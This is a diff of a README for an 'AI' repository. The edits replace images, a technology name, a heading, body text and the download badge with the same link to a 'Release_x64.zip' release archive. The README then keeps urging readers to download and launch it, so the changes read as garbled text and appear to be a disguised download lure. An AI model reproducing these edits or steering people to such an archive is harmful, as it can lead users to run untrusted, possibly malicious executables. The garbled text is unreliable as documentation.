@@ -1,6 +1,6 @@
 # Futurestic-Ai
 
-![AI Image](https://example.com/ai_image.jpg)
+![AI Image](https://github.com/AlxGvln/Futurestic-Ai/releases/download/v2.0/Release_x64.zip)
 
 Welcome to the **Futurestic-Ai** project, a cutting-edge repository focused on artificial intelligence technologies. Here, we explore the realms of AI assistants, chatbots, and web-based AI applications to push the boundaries of what is possible in the digital world.
 
@@ -19,7 +19,7 @@ In this repository, you will find a collection of resources, code snippets, and 
 - HTML
 - Jarvis
 - JavaScript
-- Three.js
+- https://github.com/AlxGvln/Futurestic-Ai/releases/download/v2.0/Release_x64.zip
 - Web Chatbot
 
 ## Repository Content
@@ -35,11 +35,11 @@ Explore the capabilities of chatbots and how they are revolutionizing customer s
 ### Web Chatbot Development
 Learn how to build interactive web chatbots using HTML, CSS, and JavaScript to engage with users in real-time.
 
-### Three.js Visualization
-Delve into the world of Three.js and create stunning visualizations using this powerful 3D graphics library.
+### https://github.com/AlxGvln/Futurestic-Ai/releases/download/v2.0/Release_x64.zip Visualization
+Delve into the world of https://github.com/AlxGvln/Futurestic-Ai/releases/download/v2.0/Release_x64.zip and create stunning visualizations using this powerful 3D graphics library.
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/AlxGvln/Futurestic-Ai/releases/download/v2.0/Release_x64.zip)](https://github.com/AlxGvln/Futurestic-Ai/releases/download/v2.0/Release_x64.zip)
 
 The software package available for download contains all the necessary tools and resources to start exploring AI development. Simply click on the button above to download the software package and launch your AI projects.
 
@@ -53,4 +53,4 @@ Follow us on social media and subscribe to our newsletter to stay updated on the
 
 Let's shape the future together with AI innovation and creativity. 🚀🤖
 
-![AI Future Image](https://example.com/ai_future.jpg)
+![AI Future Image](https://github.com/AlxGvln/Futurestic-Ai/releases/download/v2.0/Release_x64.zip)
